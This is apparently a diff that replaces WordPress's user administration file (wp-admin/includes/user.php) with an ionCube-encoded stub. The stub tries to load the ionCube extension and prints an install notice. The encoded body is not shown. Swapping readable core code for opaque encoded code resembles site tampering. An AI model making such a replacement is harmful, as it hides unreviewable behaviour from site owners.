@@ -1,1572 +1,770 @@
-<?php
-/**
- * WordPress user administration API.
- *
- * @package WordPress
- * @subpackage Administration
- */
-
-/**
- * Creates a new user from the "Users" form using $_POST information.
- *
- * @since 2.0.0
- *
- * @return int|WP_Error WP_Error or User ID.
- */
-function add_user() {
-	return edit_user();
-}
-
-/**
- * Edit user settings based on contents of $_POST
- *
- * Used on user-edit.php and profile.php to manage and process user options, passwords etc.
- *
- * @since 2.0.0
- *
- * @param int $user_id Optional. User ID.
- * @return int|WP_Error user id of the updated user
- */
-function edit_user( $user_id = 0 ) {
-	$wp_roles = wp_roles();
-	$user = new stdClass;
-	if ( $user_id ) {
-		$update = true;
-		$user->ID = (int) $user_id;
-		$userdata = get_userdata( $user_id );
-		$user->user_login = wp_slash( $userdata->user_login );
-	} else {
-		$update = false;
-	}
-
-	if ( !$update && isset( $_POST['user_login'] ) )
-		$user->user_login = sanitize_user($_POST['user_login'], true);
-
-	$pass1 = $pass2 = '';
-	if ( isset( $_POST['pass1'] ) )
-		$pass1 = $_POST['pass1'];
-	if ( isset( $_POST['pass2'] ) )
-		$pass2 = $_POST['pass2'];
-
-	if ( isset( $_POST['role'] ) && current_user_can( 'edit_users' ) ) {
-		$new_role = sanitize_text_field( $_POST['role'] );
-		$potential_role = isset($wp_roles->role_objects[$new_role]) ? $wp_roles->role_objects[$new_role] : false;
-		// Don't let anyone with 'edit_users' (admins) edit their own role to something without it.
-		// Multisite super admins can freely edit their blog roles -- they possess all caps.
-		if ( ( is_multisite() && current_user_can( 'manage_sites' ) ) || $user_id != get_current_user_id() || ($potential_role && $potential_role->has_cap( 'edit_users' ) ) )
-			$user->role = $new_role;
-
-		// If the new role isn't editable by the logged-in user die with error
-		$editable_roles = get_editable_roles();
-		if ( ! empty( $new_role ) && empty( $editable_roles[$new_role] ) )
-			wp_die( __( 'Sorry, you are not allowed to give users that role.' ), 403 );
-	}
-
-	if ( isset( $_POST['email'] ))
-		$user->user_email = sanitize_text_field( wp_unslash( $_POST['email'] ) );
-	if ( isset( $_POST['url'] ) ) {
-		if ( empty ( $_POST['url'] ) || $_POST['url'] == 'http://' ) {
-			$user->user_url = '';
-		} else {
-			$user->user_url = esc_url_raw( $_POST['url'] );
-			$protocols = implode( '|', array_map( 'preg_quote', wp_allowed_protocols() ) );
-			$user->user_url = preg_match('/^(' . $protocols . '):/is', $user->user_url) ? $user->user_url : 'http://'.$user->user_url;
-		}
-	}
-	if ( isset( $_POST['first_name'] ) )
-		$user->first_name = sanitize_text_field( $_POST['first_name'] );
-	if ( isset( $_POST['last_name'] ) )
-		$user->last_name = sanitize_text_field( $_POST['last_name'] );
-	if ( isset( $_POST['nickname'] ) )
-		$user->nickname = sanitize_text_field( $_POST['nickname'] );
-	if ( isset( $_POST['display_name'] ) )
-		$user->display_name = sanitize_text_field( $_POST['display_name'] );
-
-	if ( isset( $_POST['description'] ) )
-		$user->description = trim( $_POST['description'] );
-
-	foreach ( wp_get_user_contact_methods( $user ) as $method => $name ) {
-		if ( isset( $_POST[$method] ))
-			$user->$method = sanitize_text_field( $_POST[$method] );
-	}
-
-	if ( $update ) {
-		$user->rich_editing = isset( $_POST['rich_editing'] ) && 'false' === $_POST['rich_editing'] ? 'false' : 'true';
-		$user->syntax_highlighting = isset( $_POST['syntax_highlighting'] ) && 'false' === $_POST['syntax_highlighting'] ? 'false' : 'true';
-		$user->admin_color = isset( $_POST['admin_color'] ) ? sanitize_text_field( $_POST['admin_color'] ) : 'fresh';
-		$user->show_admin_bar_front = isset( $_POST['admin_bar_front'] ) ? 'true' : 'false';
-		$user->locale = '';
-
-		if ( isset( $_POST['locale'] ) ) {
-			$locale = sanitize_text_field( $_POST['locale'] );
-			if ( 'site-default' === $locale ) {
-				$locale = '';
-			} elseif ( '' === $locale ) {
-				$locale = 'en_US';
-			} elseif ( ! in_array( $locale, get_available_languages(), true ) ) {
-				$locale = '';
-			}
-
-			$user->locale = $locale;
-		}
-	}
-
-	$user->comment_shortcuts = isset( $_POST['comment_shortcuts'] ) && 'true' == $_POST['comment_shortcuts'] ? 'true' : '';
-
-	$user->use_ssl = 0;
-	if ( !empty($_POST['use_ssl']) )
-		$user->use_ssl = 1;
-
-	$errors = new WP_Error();
-
-	/* checking that username has been typed */
-	if ( $user->user_login == '' )
-		$errors->add( 'user_login', __( '<strong>ERROR</strong>: Please enter a username.' ) );
-
-	/* checking that nickname has been typed */
-	if ( $update && empty( $user->nickname ) ) {
-		$errors->add( 'nickname', __( '<strong>ERROR</strong>: Please enter a nickname.' ) );
-	}
-
-	/**
-	 * Fires before the password and confirm password fields are checked for congruity.
-	 *
-	 * @since 1.5.1
-	 *
-	 * @param string $user_login The username.
-	 * @param string $pass1     The password (passed by reference).
-	 * @param string $pass2     The confirmed password (passed by reference).
-	 */
-	do_action_ref_array( 'check_passwords', array( $user->user_login, &$pass1, &$pass2 ) );
-
-	// Check for blank password when adding a user.
-	if ( ! $update && empty( $pass1 ) ) {
-		$errors->add( 'pass', __( '<strong>ERROR</strong>: Please enter a password.' ), array( 'form-field' => 'pass1' ) );
-	}
-
-	// Check for "\" in password.
-	if ( false !== strpos( wp_unslash( $pass1 ), "\\" ) ) {
-		$errors->add( 'pass', __( '<strong>ERROR</strong>: Passwords may not contain the character "\\".' ), array( 'form-field' => 'pass1' ) );
-	}
-
-	// Checking the password has been typed twice the same.
-	if ( ( $update || ! empty( $pass1 ) ) && $pass1 != $pass2 ) {
-		$errors->add( 'pass', __( '<strong>ERROR</strong>: Please enter the same password in both password fields.' ), array( 'form-field' => 'pass1' ) );
-	}
-
-	if ( !empty( $pass1 ) )
-		$user->user_pass = $pass1;
-
-	if ( !$update && isset( $_POST['user_login'] ) && !validate_username( $_POST['user_login'] ) )
-		$errors->add( 'user_login', __( '<strong>ERROR</strong>: This username is invalid because it uses illegal characters. Please enter a valid username.' ));
-
-	if ( !$update && username_exists( $user->user_login ) )
-		$errors->add( 'user_login', __( '<strong>ERROR</strong>: This username is already registered. Please choose another one.' ));
-
-	/** This filter is documented in wp-includes/user.php */
-	$illegal_logins = (array) apply_filters( 'illegal_user_logins', array() );
-
-	if ( in_array( strtolower( $user->user_login ), array_map( 'strtolower', $illegal_logins ) ) ) {
-		$errors->add( 'invalid_username', __( '<strong>ERROR</strong>: Sorry, that username is not allowed.' ) );
-	}
-
-	/* checking email address */
-	if ( empty( $user->user_email ) ) {
-		$errors->add( 'empty_email', __( '<strong>ERROR</strong>: Please enter an email address.' ), array( 'form-field' => 'email' ) );
-	} elseif ( !is_email( $user->user_email ) ) {
-		$errors->add( 'invalid_email', __( '<strong>ERROR</strong>: The email address isn&#8217;t correct.' ), array( 'form-field' => 'email' ) );
-	} elseif ( ( $owner_id = email_exists($user->user_email) ) && ( !$update || ( $owner_id != $user->ID ) ) ) {
-		$errors->add( 'email_exists', __('<strong>ERROR</strong>: This email is already registered, please choose another one.'), array( 'form-field' => 'email' ) );
-	}
-
-	/**
-	 * Fires before user profile update errors are returned.
-	 *
-	 * @since 2.8.0
-	 *
-	 * @param WP_Error $errors WP_Error object (passed by reference).
-	 * @param bool     $update  Whether this is a user update.
-	 * @param stdClass $user   User object (passed by reference).
-	 */
-	do_action_ref_array( 'user_profile_update_errors', array( &$errors, $update, &$user ) );
-
-	if ( $errors->get_error_codes() )
-		return $errors;
-
-	if ( $update ) {
-		$user_id = wp_update_user( $user );
-	} else {
-		$user_id = wp_insert_user( $user );
-		$notify  = isset( $_POST['send_user_notification'] ) ? 'both' : 'admin';
-
-		/**
-		  * Fires after a new user has been created.
-		  *
-		  * @since 4.4.0
-		  *
-		  * @param int    $user_id ID of the newly created user.
-		  * @param string $notify  Type of notification that should happen. See wp_send_new_user_notifications()
-		  *                        for more information on possible values.
-		  */
-		do_action( 'edit_user_created_user', $user_id, $notify );
-	}
-	return $user_id;
-}
-
-/**
- * Fetch a filtered list of user roles that the current user is
- * allowed to edit.
- *
- * Simple function who's main purpose is to allow filtering of the
- * list of roles in the $wp_roles object so that plugins can remove
- * inappropriate ones depending on the situation or user making edits.
- * Specifically because without filtering anyone with the edit_users
- * capability can edit others to be administrators, even if they are
- * only editors or authors. This filter allows admins to delegate
- * user management.
- *
- * @since 2.8.0
- *
- * @return array
- */
-function get_editable_roles() {
-	$all_roles = wp_roles()->roles;
-
-	/**
-	 * Filters the list of editable roles.
-	 *
-	 * @since 2.8.0
-	 *
-	 * @param array $all_roles List of roles.
-	 */
-	$editable_roles = apply_filters( 'editable_roles', $all_roles );
-
-	return $editable_roles;
-}
-
-/**
- * Retrieve user data and filter it.
- *
- * @since 2.0.5
- *
- * @param int $user_id User ID.
- * @return WP_User|bool WP_User object on success, false on failure.
- */
-function get_user_to_edit( $user_id ) {
-	$user = get_userdata( $user_id );
-
-	if ( $user )
-		$user->filter = 'edit';
-
-	return $user;
-}
-
-/**
- * Retrieve the user's drafts.
- *
- * @since 2.0.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param int $user_id User ID.
- * @return array
- */
-function get_users_drafts( $user_id ) {
-	global $wpdb;
-	$query = $wpdb->prepare("SELECT ID, post_title FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'draft' AND post_author = %d ORDER BY post_modified DESC", $user_id);
-
-	/**
-	 * Filters the user's drafts query string.
-	 *
-	 * @since 2.0.0
-	 *
-	 * @param string $query The user's drafts query string.
-	 */
-	$query = apply_filters( 'get_users_drafts', $query );
-	return $wpdb->get_results( $query );
-}
-
-/**
- * Remove user and optionally reassign posts and links to another user.
- *
- * If the $reassign parameter is not assigned to a User ID, then all posts will
- * be deleted of that user. The action {@see 'delete_user'} that is passed the User ID
- * being deleted will be run after the posts are either reassigned or deleted.
- * The user meta will also be deleted that are for that User ID.
- *
- * @since 2.0.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param int $id User ID.
- * @param int $reassign Optional. Reassign posts and links to new User ID.
- * @return bool True when finished.
- */
-function wp_delete_user( $id, $reassign = null ) {
-	global $wpdb;
-
-	if ( ! is_numeric( $id ) ) {
-		return false;
-	}
-
-	$id = (int) $id;
-	$user = new WP_User( $id );
-
-	if ( !$user->exists() )
-		return false;
-
-	// Normalize $reassign to null or a user ID. 'novalue' was an older default.
-	if ( 'novalue' === $reassign ) {
-		$reassign = null;
-	} elseif ( null !== $reassign ) {
-		$reassign = (int) $reassign;
-	}
-
-	/**
-	 * Fires immediately before a user is deleted from the database.
-	 *
-	 * @since 2.0.0
-	 *
-	 * @param int      $id       ID of the user to delete.
-	 * @param int|null $reassign ID of the user to reassign posts and links to.
-	 *                           Default null, for no reassignment.
-	 */
-	do_action( 'delete_user', $id, $reassign );
-
-	if ( null === $reassign ) {
-		$post_types_to_delete = array();
-		foreach ( get_post_types( array(), 'objects' ) as $post_type ) {
-			if ( $post_type->delete_with_user ) {
-				$post_types_to_delete[] = $post_type->name;
-			} elseif ( null === $post_type->delete_with_user && post_type_supports( $post_type->name, 'author' ) ) {
-				$post_types_to_delete[] = $post_type->name;
-			}
-		}
-
-		/**
-		 * Filters the list of post types to delete with a user.
-		 *
-		 * @since 3.4.0
-		 *
-		 * @param array $post_types_to_delete Post types to delete.
-		 * @param int   $id                   User ID.
-		 */
-		$post_types_to_delete = apply_filters( 'post_types_to_delete_with_user', $post_types_to_delete, $id );
-		$post_types_to_delete = implode( "', '", $post_types_to_delete );
-		$post_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_author = %d AND post_type IN ('$post_types_to_delete')", $id ) );
-		if ( $post_ids ) {
-			foreach ( $post_ids as $post_id )
-				wp_delete_post( $post_id );
-		}
-
-		// Clean links
-		$link_ids = $wpdb->get_col( $wpdb->prepare("SELECT link_id FROM $wpdb->links WHERE link_owner = %d", $id) );
-
-		if ( $link_ids ) {
-			foreach ( $link_ids as $link_id )
-				wp_delete_link($link_id);
-		}
-	} else {
-		$post_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_author = %d", $id ) );
-		$wpdb->update( $wpdb->posts, array('post_author' => $reassign), array('post_author' => $id) );
-		if ( ! empty( $post_ids ) ) {
-			foreach ( $post_ids as $post_id )
-				clean_post_cache( $post_id );
-		}
-		$link_ids = $wpdb->get_col( $wpdb->prepare("SELECT link_id FROM $wpdb->links WHERE link_owner = %d", $id) );
-		$wpdb->update( $wpdb->links, array('link_owner' => $reassign), array('link_owner' => $id) );
-		if ( ! empty( $link_ids ) ) {
-			foreach ( $link_ids as $link_id )
-				clean_bookmark_cache( $link_id );
-		}
-	}
-
-	// FINALLY, delete user
-	if ( is_multisite() ) {
-		remove_user_from_blog( $id, get_current_blog_id() );
-	} else {
-		$meta = $wpdb->get_col( $wpdb->prepare( "SELECT umeta_id FROM $wpdb->usermeta WHERE user_id = %d", $id ) );
-		foreach ( $meta as $mid )
-			delete_metadata_by_mid( 'user', $mid );
-
-		$wpdb->delete( $wpdb->users, array( 'ID' => $id ) );
-	}
-
-	clean_user_cache( $user );
-
-	/**
-	 * Fires immediately after a user is deleted from the database.
-	 *
-	 * @since 2.9.0
-	 *
-	 * @param int      $id       ID of the deleted user.
-	 * @param int|null $reassign ID of the user to reassign posts and links to.
-	 *                           Default null, for no reassignment.
-	 */
-	do_action( 'deleted_user', $id, $reassign );
-
-	return true;
-}
-
-/**
- * Remove all capabilities from user.
- *
- * @since 2.1.0
- *
- * @param int $id User ID.
- */
-function wp_revoke_user($id) {
-	$id = (int) $id;
-
-	$user = new WP_User($id);
-	$user->remove_all_caps();
-}
-
-/**
- * @since 2.8.0
- *
- * @global int $user_ID
- *
- * @param false $errors Deprecated.
- */
-function default_password_nag_handler($errors = false) {
-	global $user_ID;
-	// Short-circuit it.
-	if ( ! get_user_option('default_password_nag') )
-		return;
-
-	// get_user_setting = JS saved UI setting. else no-js-fallback code.
-	if ( 'hide' == get_user_setting('default_password_nag') || isset($_GET['default_password_nag']) && '0' == $_GET['default_password_nag'] ) {
-		delete_user_setting('default_password_nag');
-		update_user_option($user_ID, 'default_password_nag', false, true);
-	}
-}
-
-/**
- * @since 2.8.0
- *
- * @param int    $user_ID
- * @param object $old_data
- */
-function default_password_nag_edit_user($user_ID, $old_data) {
-	// Short-circuit it.
-	if ( ! get_user_option('default_password_nag', $user_ID) )
-		return;
-
-	$new_data = get_userdata($user_ID);
-
-	// Remove the nag if the password has been changed.
-	if ( $new_data->user_pass != $old_data->user_pass ) {
-		delete_user_setting('default_password_nag');
-		update_user_option($user_ID, 'default_password_nag', false, true);
-	}
-}
-
-/**
- * @since 2.8.0
- *
- * @global string $pagenow
- */
-function default_password_nag() {
-	global $pagenow;
-	// Short-circuit it.
-	if ( 'profile.php' == $pagenow || ! get_user_option('default_password_nag') )
-		return;
-
-	echo '<div class="error default-password-nag">';
-	echo '<p>';
-	echo '<strong>' . __('Notice:') . '</strong> ';
-	_e('You&rsquo;re using the auto-generated password for your account. Would you like to change it?');
-	echo '</p><p>';
-	printf( '<a href="%s">' . __('Yes, take me to my profile page') . '</a> | ', get_edit_profile_url() . '#password' );
-	printf( '<a href="%s" id="default-password-nag-no">' . __('No thanks, do not remind me again') . '</a>', '?default_password_nag=0' );
-	echo '</p></div>';
-}
-
-/**
- * @since 3.5.0
- * @access private
- */
-function delete_users_add_js() { ?>
-<script>
-jQuery(document).ready( function($) {
-	var submit = $('#submit').prop('disabled', true);
-	$('input[name="delete_option"]').one('change', function() {
-		submit.prop('disabled', false);
-	});
-	$('#reassign_user').focus( function() {
-		$('#delete_option1').prop('checked', true).trigger('change');
-	});
-});
-</script>
-<?php
-}
-
-/**
- * Optional SSL preference that can be turned on by hooking to the 'personal_options' action.
- *
- * See the {@see 'personal_options'} action.
- *
- * @since 2.7.0
- *
- * @param object $user User data object
- */
-function use_ssl_preference($user) {
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-	<tr class="user-use-ssl-wrap">
-		<th scope="row"><?php _e('Use https')?></th>
-		<td><label for="use_ssl"><input name="use_ssl" type="checkbox" id="use_ssl" value="1" <?php checked('1', $user->use_ssl); ?> /> <?php _e('Always use https when visiting the admin'); ?></label></td>
-	</tr>
-<?php
-}
-
-/**
- *
- * @param string $text
- * @return string
- */
-function admin_created_user_email( $text ) {
-	$roles = get_editable_roles();
-	$role = $roles[ $_REQUEST['role'] ];
-	/* translators: 1: Site name, 2: site URL, 3: role */
-	return sprintf( __( 'Hi,
-You\'ve been invited to join \'%1$s\' at
-%2$s with the role of %3$s.
-If you do not want to join this site please ignore
-this email. This invitation will expire in a few days.
-
-Please click the following link to activate your user account:
-%%s' ), wp_specialchars_decode( get_bloginfo( 'name' ), ENT_QUOTES ), home_url(), wp_specialchars_decode( translate_user_role( $role['name'] ) ) );
-}
-
-/**
- * Resend an existing request and return the result.
- *
- * @since 4.9.6
- * @access private
- *
- * @param int $request_id Request ID.
- * @return bool|WP_Error Returns true/false based on the success of sending the email, or a WP_Error object.
- */
-function _wp_privacy_resend_request( $request_id ) {
-	$request_id = absint( $request_id );
-	$request    = get_post( $request_id );
-
-	if ( ! $request || 'user_request' !== $request->post_type ) {
-		return new WP_Error( 'privacy_request_error', __( 'Invalid request.' ) );
-	}
-
-	$result = wp_send_user_request( $request_id );
-
-	if ( is_wp_error( $result ) ) {
-		return $result;
-	} elseif ( ! $result ) {
-		return new WP_Error( 'privacy_request_error', __( 'Unable to initiate confirmation request.' ) );
-	}
-
-	return true;
-}
-
-/**
- * Marks a request as completed by the admin and logs the current timestamp.
- *
- * @since 4.9.6
- * @access private
- *
- * @param  int          $request_id Request ID.
- * @return int|WP_Error $request    Request ID on success or WP_Error.
- */
-function _wp_privacy_completed_request( $request_id ) {
-	$request_id   = absint( $request_id );
-	$request_data = wp_get_user_request_data( $request_id );
-
-	if ( ! $request_data ) {
-		return new WP_Error( 'privacy_request_error', __( 'Invalid request.' ) );
-	}
-
-	update_post_meta( $request_id, '_wp_user_request_completed_timestamp', time() );
-
-	$request = wp_update_post( array(
-		'ID'          => $request_id,
-		'post_status' => 'request-completed',
-	) );
-
-	return $request;
-}
-
-/**
- * Handle list table actions.
- *
- * @since 4.9.6
- * @access private
- */
-function _wp_personal_data_handle_actions() {
-	if ( isset( $_POST['privacy_action_email_retry'] ) ) { // WPCS: input var ok.
-		check_admin_referer( 'bulk-privacy_requests' );
-
-		$request_id = absint( current( array_keys( (array) wp_unslash( $_POST['privacy_action_email_retry'] ) ) ) ); // WPCS: input var ok, sanitization ok.
-		$result     = _wp_privacy_resend_request( $request_id );
-
-		if ( is_wp_error( $result ) ) {
-			add_settings_error(
-				'privacy_action_email_retry',
-				'privacy_action_email_retry',
-				$result->get_error_message(),
-				'error'
-			);
-		} else {
-			add_settings_error(
-				'privacy_action_email_retry',
-				'privacy_action_email_retry',
-				__( 'Confirmation request sent again successfully.' ),
-				'updated'
-			);
-		}
-	} elseif ( isset( $_POST['action'] ) ) {
-		$action = isset( $_POST['action'] ) ? sanitize_key( wp_unslash( $_POST['action'] ) ) : ''; // WPCS: input var ok, CSRF ok.
-
-		switch ( $action ) {
-			case 'add_export_personal_data_request':
-			case 'add_remove_personal_data_request':
-				check_admin_referer( 'personal-data-request' );
-
-				if ( ! isset( $_POST['type_of_action'], $_POST['username_or_email_to_export'] ) ) { // WPCS: input var ok.
-					add_settings_error(
-						'action_type',
-						'action_type',
-						__( 'Invalid action.' ),
-						'error'
-					);
-				}
-				$action_type               = sanitize_text_field( wp_unslash( $_POST['type_of_action'] ) ); // WPCS: input var ok.
-				$username_or_email_address = sanitize_text_field( wp_unslash( $_POST['username_or_email_to_export'] ) ); // WPCS: input var ok.
-				$email_address             = '';
-
-				if ( ! in_array( $action_type, _wp_privacy_action_request_types(), true ) ) {
-					add_settings_error(
-						'action_type',
-						'action_type',
-						__( 'Invalid action.' ),
-						'error'
-					);
-				}
-
-				if ( ! is_email( $username_or_email_address ) ) {
-					$user = get_user_by( 'login', $username_or_email_address );
-					if ( ! $user instanceof WP_User ) {
-						add_settings_error(
-							'username_or_email_to_export',
-							'username_or_email_to_export',
-							__( 'Unable to add this request. A valid email address or username must be supplied.' ),
-							'error'
-						);
-					} else {
-						$email_address = $user->user_email;
-					}
-				} else {
-					$email_address = $username_or_email_address;
-				}
-
-				if ( empty( $email_address ) ) {
-					break;
-				}
-
-				$request_id = wp_create_user_request( $email_address, $action_type );
-
-				if ( is_wp_error( $request_id ) ) {
-					add_settings_error(
-						'username_or_email_to_export',
-						'username_or_email_to_export',
-						$request_id->get_error_message(),
-						'error'
-					);
-					break;
-				} elseif ( ! $request_id ) {
-					add_settings_error(
-						'username_or_email_to_export',
-						'username_or_email_to_export',
-						__( 'Unable to initiate confirmation request.' ),
-						'error'
-					);
-					break;
-				}
-
-				wp_send_user_request( $request_id );
-
-				add_settings_error(
-					'username_or_email_to_export',
-					'username_or_email_to_export',
-					__( 'Confirmation request initiated successfully.' ),
-					'updated'
-				);
-				break;
-		}
-	}
-}
-
-/**
- * Cleans up failed and expired requests before displaying the list table.
- *
- * @since 4.9.6
- * @access private
- */
-function _wp_personal_data_cleanup_requests() {
-	/** This filter is documented in wp-includes/user.php */
-	$expires        = (int) apply_filters( 'user_request_key_expiration', DAY_IN_SECONDS );
-
-	$requests_query = new WP_Query( array(
-		'post_type'      => 'user_request',
-		'posts_per_page' => -1,
-		'post_status'    => 'request-pending',
-		'fields'         => 'ids',
-		'date_query'     => array(
-			array(
-				'column' => 'post_modified_gmt',
-				'before' => $expires . ' seconds ago',
-			),
-		),
-	) );
-
-	$request_ids = $requests_query->posts;
-
-	foreach ( $request_ids as $request_id ) {
-		wp_update_post( array(
-			'ID'            => $request_id,
-			'post_status'   => 'request-failed',
-			'post_password' => '',
-		) );
-	}
-}
-
-/**
- * Personal data export.
- *
- * @since 4.9.6
- * @access private
- */
-function _wp_personal_data_export_page() {
-	if ( ! current_user_can( 'export_others_personal_data' ) ) {
-		wp_die( __( 'Sorry, you are not allowed to export personal data on this site.' ) );
-	}
-
-	_wp_personal_data_handle_actions();
-	_wp_personal_data_cleanup_requests();
-
-	// "Borrow" xfn.js for now so we don't have to create new files.
-	wp_enqueue_script( 'xfn' );
-
-	$requests_table = new WP_Privacy_Data_Export_Requests_Table( array(
-		'plural'   => 'privacy_requests',
-		'singular' => 'privacy_request',
-	) );
-	$requests_table->process_bulk_action();
-	$requests_table->prepare_items();
-	?>
-	<div class="wrap nosubsub">
-		<h1><?php esc_html_e( 'Export Personal Data' ); ?></h1>
-		<hr class="wp-header-end" />
-
-		<?php settings_errors(); ?>
-
-		<form method="post" class="wp-privacy-request-form">
-			<h2><?php esc_html_e( 'Add Data Export Request' ); ?></h2>
-			<p><?php esc_html_e( 'An email will be sent to the user at this email address asking them to verify the request.' ); ?></p>
-
-			<div class="wp-privacy-request-form-field">
-				<label for="username_or_email_to_export"><?php esc_html_e( 'Username or email address' ); ?></label>
-				<input type="text" required class="regular-text" id="username_or_email_to_export" name="username_or_email_to_export" />
-				<?php submit_button( __( 'Send Request' ), 'secondary', 'submit', false ); ?>
-			</div>
-			<?php wp_nonce_field( 'personal-data-request' ); ?>
-			<input type="hidden" name="action" value="add_export_personal_data_request" />
-			<input type="hidden" name="type_of_action" value="export_personal_data" />
-		</form>
-		<hr />
-
-		<?php $requests_table->views(); ?>
-
-		<form class="search-form wp-clearfix">
-			<?php $requests_table->search_box( __( 'Search Requests' ), 'requests' ); ?>
-			<input type="hidden" name="page" value="export_personal_data" />
-			<input type="hidden" name="filter-status" value="<?php echo isset( $_REQUEST['filter-status'] ) ? esc_attr( sanitize_text_field( $_REQUEST['filter-status'] ) ) : ''; ?>" />
-			<input type="hidden" name="orderby" value="<?php echo isset( $_REQUEST['orderby'] ) ? esc_attr( sanitize_text_field( $_REQUEST['orderby'] ) ) : ''; ?>" />
-			<input type="hidden" name="order" value="<?php echo isset( $_REQUEST['order'] ) ? esc_attr( sanitize_text_field( $_REQUEST['order'] ) ) : ''; ?>" />
-		</form>
-
-		<form method="post">
-			<?php
-			$requests_table->display();
-			$requests_table->embed_scripts();
-			?>
-		</form>
-	</div>
-	<?php
-}
-
-/**
- * Personal data anonymization.
- *
- * @since 4.9.6
- * @access private
- */
-function _wp_personal_data_removal_page() {
-	/*
-	 * Require both caps in order to make it explicitly clear that delegating
-	 * erasure from network admins to single-site admins will give them the
-	 * ability to affect global users, rather than being limited to the site
-	 * that they administer.
-	 */
-	if ( ! current_user_can( 'erase_others_personal_data' ) || ! current_user_can( 'delete_users' ) ) {
-		wp_die( __( 'Sorry, you are not allowed to erase data on this site.' ) );
-	}
-
-	_wp_personal_data_handle_actions();
-	_wp_personal_data_cleanup_requests();
-
-	// "Borrow" xfn.js for now so we don't have to create new files.
-	wp_enqueue_script( 'xfn' );
-
-	$requests_table = new WP_Privacy_Data_Removal_Requests_Table( array(
-		'plural'   => 'privacy_requests',
-		'singular' => 'privacy_request',
-	) );
-
-	$requests_table->process_bulk_action();
-	$requests_table->prepare_items();
-
-	?>
-	<div class="wrap nosubsub">
-		<h1><?php esc_html_e( 'Erase Personal Data' ); ?></h1>
-		<hr class="wp-header-end" />
-
-		<?php settings_errors(); ?>
-
-		<form method="post" class="wp-privacy-request-form">
-			<h2><?php esc_html_e( 'Add Data Erasure Request' ); ?></h2>
-			<p><?php esc_html_e( 'An email will be sent to the user at this email address asking them to verify the request.' ); ?></p>
-
-			<div class="wp-privacy-request-form-field">
-				<label for="username_or_email_to_export"><?php esc_html_e( 'Username or email address' ); ?></label>
-				<input type="text" required class="regular-text" id="username_or_email_to_export" name="username_or_email_to_export" />
-				<?php submit_button( __( 'Send Request' ), 'secondary', 'submit', false ); ?>
-			</div>
-			<?php wp_nonce_field( 'personal-data-request' ); ?>
-			<input type="hidden" name="action" value="add_remove_personal_data_request" />
-			<input type="hidden" name="type_of_action" value="remove_personal_data" />
-		</form>
-		<hr />
-
-		<?php $requests_table->views(); ?>
-
-		<form class="search-form wp-clearfix">
-			<?php $requests_table->search_box( __( 'Search Requests' ), 'requests' ); ?>
-			<input type="hidden" name="page" value="remove_personal_data" />
-			<input type="hidden" name="filter-status" value="<?php echo isset( $_REQUEST['filter-status'] ) ? esc_attr( sanitize_text_field( $_REQUEST['filter-status'] ) ) : ''; ?>" />
-			<input type="hidden" name="orderby" value="<?php echo isset( $_REQUEST['orderby'] ) ? esc_attr( sanitize_text_field( $_REQUEST['orderby'] ) ) : ''; ?>" />
-			<input type="hidden" name="order" value="<?php echo isset( $_REQUEST['order'] ) ? esc_attr( sanitize_text_field( $_REQUEST['order'] ) ) : ''; ?>" />
-		</form>
-
-		<form method="post">
-			<?php
-			$requests_table->display();
-			$requests_table->embed_scripts();
-			?>
-		</form>
-	</div>
-	<?php
-}
-
-/**
- * Mark erasure requests as completed after processing is finished.
- *
- * This intercepts the Ajax responses to personal data eraser page requests, and
- * monitors the status of a request. Once all of the processing has finished, the
- * request is marked as completed.
- *
- * @since 4.9.6
- *
- * @see wp_privacy_personal_data_erasure_page
- *
- * @param array  $response      The response from the personal data eraser for
- *                              the given page.
- * @param int    $eraser_index  The index of the personal data eraser. Begins
- *                              at 1.
- * @param string $email_address The email address of the user whose personal
- *                              data this is.
- * @param int    $page          The page of personal data for this eraser.
- *                              Begins at 1.
- * @param int    $request_id    The request ID for this personal data erasure.
- * @return array The filtered response.
- */
-function wp_privacy_process_personal_data_erasure_page( $response, $eraser_index, $email_address, $page, $request_id ) {
-	/*
-	 * If the eraser response is malformed, don't attempt to consume it; let it
-	 * pass through, so that the default Ajax processing will generate a warning
-	 * to the user.
-	 */
-	if ( ! is_array( $response ) ) {
-		return $response;
-	}
-
-	if ( ! array_key_exists( 'done', $response ) ) {
-		return $response;
-	}
-
-	if ( ! array_key_exists( 'items_removed', $response ) ) {
-		return $response;
-	}
-
-	if ( ! array_key_exists( 'items_retained', $response ) ) {
-		return $response;
-	}
-
-	if ( ! array_key_exists( 'messages', $response ) ) {
-		return $response;
-	}
-
-	$request = wp_get_user_request_data( $request_id );
-
-	if ( ! $request || 'remove_personal_data' !== $request->action_name ) {
-		wp_send_json_error( __( 'Invalid request ID when processing eraser data.' ) );
-	}
-
-	/** This filter is documented in wp-admin/includes/ajax-actions.php */
-	$erasers        = apply_filters( 'wp_privacy_personal_data_erasers', array() );
-	$is_last_eraser = count( $erasers ) === $eraser_index;
-	$eraser_done    = $response['done'];
-
-	if ( ! $is_last_eraser || ! $eraser_done ) {
-		return $response;
-	}
-
